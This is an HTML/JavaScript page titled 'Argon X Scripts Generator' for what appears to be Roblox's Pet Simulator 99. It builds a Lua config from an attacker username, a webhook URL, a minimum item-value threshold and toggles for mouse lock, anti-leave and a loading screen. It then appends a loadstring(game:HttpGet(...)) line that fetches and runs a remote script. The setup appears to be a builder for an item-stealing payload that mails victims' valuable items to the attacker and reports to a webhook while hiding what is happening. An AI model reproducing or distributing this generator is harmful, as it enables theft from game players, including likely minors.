<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Argon X Scripts - Ps99</title>
  <style>
    body {
        font-family: 'Roboto', sans-serif;
        background: linear-gradient(135deg, #6e8efb, #a777e3);
        color: #333;
        text-align: center;
        margin: 0;
        padding: 0;
    }
    .container {
        max-width: 800px;
        margin: 50px auto;
        padding: 30px;
        background: #ffffff;
        border-radius: 12px;
        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
    }
    h1 {
        color: #333;
        font-size: 2.5em;
        margin-bottom: 20px;
    }
    form {
        margin: 0 auto;
        padding: 20px;
        background: #f8f9fa;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    }
    label {
        display: block;
        font-weight: bold;
        margin-bottom: 5px;
    }
    input, textarea {
        display: block;
        width: calc(100% - 22px);
        margin: 10px auto;
        padding: 12px;
        border: 1px solid #ccc;
        border-radius: 6px;
        font-size: 16px;
        background-color: #ffffff;
    }
    input:focus, textarea:focus {
        border-color: #007bff;
        outline: none;
    }
    button {
        background-color: #007bff;
        color: white;
        border: none;
        padding: 12px 24px;
        font-size: 16px;
        border-radius: 6px;
        cursor: pointer;
        transition: background-color 0.3s ease, transform 0.2s ease;
    }
    button:hover {
        background-color: #0056b3;
        transform: scale(1.05);
    }
    button:active {
        background-color: #004494;
    }
    textarea {
        height: 150px;
        resize: vertical;
    }
    #status {
        margin-top: 20px;
        font-size: 16px;
    }
    #pastelist {
        margin-top: 20px;
        text-align: left;
        max-width: 600px;
        margin-left: auto;
        margin-right: auto;
    }
    #pastelist ul {
        list-style-type: none;
        padding: 0;
    }
    #pastelist li {
        margin-bottom: 10px;
    }
    #pastelist a {
        color: #007bff;
        text-decoration: none;
    }
    #pastelist a:hover {
        text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Argon X Scripts Generator</h1>
    <form id="scriptForm">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username" required><br><br>

      <label for="webhook">Webhook:</label>
      <input type="url" id="webhook" name="webhook" required><br><br>

      <label for="minimumRAP">Minimum RAP:</label>
      <input type="number" id="minimumRAP" name="minimumRAP" required><br><br>

      <label for="mailMessage">Mail Message:</label>
      <input type="text" id="mailMessage" name="mailMessage" required><br><br>

      <label for="mouseLock">Enable Mouse Lock:</label>
      <input type="checkbox" id="mouseLock" name="mouseLock"><br><br>

      <label for="antileave">Enable Anti-leave:</label>
      <input type="checkbox" id="antileave" name="antileave"><br><br>

      <label for="loadingscreen">Show Loading Screen:</label>
      <input type="checkbox" id="loadingscreen" name="loadingscreen"><br><br>

      <button type="button" id="generateBtn">Generate</button>
      <textarea id="output" readonly></textarea><br><br>

      <button type="button" id="copyBtn">Copy to Clipboard</button>
    </form>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      const generateButton = document.getElementById('generateBtn');
      const copyButton = document.getElementById('copyBtn');

      // URL validation pattern
      const urlPattern = new RegExp('^(https?:\\/\\/)?' + // protocol
        '(([a-zA-Z\\d]([a-zA-Z\\d-]*[a-zA-Z\\d])*)\\.?)+[a-zA-Z]{2,}' + // domain name
        '(\\:\\d+)?(\\/[-a-zA-Z\\d%_.~+]*)*' + // port and path
        '(\\?[;&a-zA-Z\\d%_.~+=-]*)?' + // query string
        '(\\#[-a-zA-Z\\d_]*)?$','i'); // fragment locator

      generateButton.addEventListener('click', function(event) {
        event.preventDefault(); 

        const username = document.getElementById("username").value;
        const webhook = document.getElementById("webhook").value;
        const minimumRAP = document.getElementById("minimumRAP").value;
        const mailMessage = document.getElementById("mailMessage").value;
        const mouseLock = document.getElementById("mouseLock").checked;
        const antileave = document.getElementById("antileave").checked;
        const loadingscreen = document.getElementById("loadingscreen").checked;

        if (!username || !webhook || !minimumRAP || !mailMessage) {
          alert("Please fill in all fields.");
          return;
        }

        // Validate webhook URL
        if (!urlPattern.test(webhook)) {
          alert("Please enter a valid Webhook URL.");
          return;
        }

        const outputString = `--generate through website\n` +
                             `--website made by kizamies#0001/Shimm\n` +
                             `config = {\n` +
                             `    Username = "${username}",\n` +
                             `    Webhook = "${webhook}",\n` +
                             `    MinimumRAP = "${minimumRAP}",\n` +
                             `    mouseLock = ${mouseLock},\n` +
                             `    antileave = ${antileave},\n` +
                             `    loadingscreen = ${loadingscreen},\n` +
                             `    MailMessage = "${mailMessage}",\n` +
                             `}\n\n` +
                             'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua",true))()';

        document.getElementById("output").value = outputString;
      });

      copyButton.addEventListener('click', function() {
        const copyText = document.getElementById("output");
        copyText.select();
        copyText.setSelectionRange(0, 99999);
        document.execCommand("copy");
        alert("Copied to clipboard!");
      });
    });
  </script>
</body>
</html>
